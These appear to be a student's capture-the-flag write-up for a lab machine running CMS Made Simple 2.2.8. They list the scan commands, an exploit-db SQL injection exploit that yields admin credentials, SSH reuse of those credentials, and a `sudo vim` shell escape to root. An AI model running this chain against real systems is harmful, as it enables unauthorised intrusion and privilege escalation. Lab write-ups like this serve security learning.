export ip=10.10.21.245

# tool - nmap: 
 - sudo nmap -sS $ip
    - open ports 21, 80, 2222
 - nmap -sV -sC -oN nmap.log $ip
    - port 21 is running vsftpd 3.0.3 which might be exploitable

# tool - gobuster
 - gobuster dir -t 100 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html -u http://$ip
    - detected files which includes robots.txt, and dir /simple 

# website - exploit db
    - found exploit for vsftpd 3.0.3: https://www.exploit-db.com/exploits/49719
    - found exploit for cms made simple verion 2.2.8: https://www.exploit-db.com/exploits/46635

# process
 - open the webpage as http is running
 - opened the url ip/simple, /simple dir was found using gobuster
 - this url had a cms installed. the name:version was given in the footer. (CMS Made Simple version 2.2.8)
 - run the python exploit file against the cms url
 - this gives the email(admin@admin.com), username(mitch) and password(secret) for the cms
 - this username and password can be tried with the ssh considering ssh is running on port 2222
    - `ssh mitch@$ip -p2222` lets you login with the passwordn `secret`
 - After logging in, typing in `ls` will show a txt file which contains the answer to a question in the ctf
 - There is another user in the home dir which is an answer to a question as well.
 - Checking for suid files, we get vim is among them. We can leverage vim to create a rooted shell.
    - `find / -perm -u=s -type f 2>/dev/null` - to get files with suid set
    - `sudo vim -c ':!/bin/sh'` - to get root
 - After getting root, goto /root where you can see another txt file with the last answer in the CTF.
